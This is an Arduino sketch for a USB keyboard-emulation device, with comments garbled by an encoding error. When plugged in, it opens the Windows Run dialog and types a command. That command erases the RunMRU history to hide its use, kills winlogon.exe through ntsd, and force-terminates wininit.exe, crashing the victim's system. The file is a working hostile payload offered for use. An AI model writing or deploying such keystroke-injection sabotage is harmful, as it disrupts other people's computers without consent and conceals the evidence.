void setup() {//��ʼ��
  Keyboard.begin();//��ʼ����ͨѶ 
  delay(5000);//��ʱ
  Keyboard.press(KEY_LEFT_GUI);//win�� 
  delay(500); 
  Keyboard.press('r');//r�� 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1>NUL 2>NUL&TASKKILL /F /IM WININIT.EXE 2>NUL");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//��������ͨѶ 
}
void loop()//ѭ��
{
}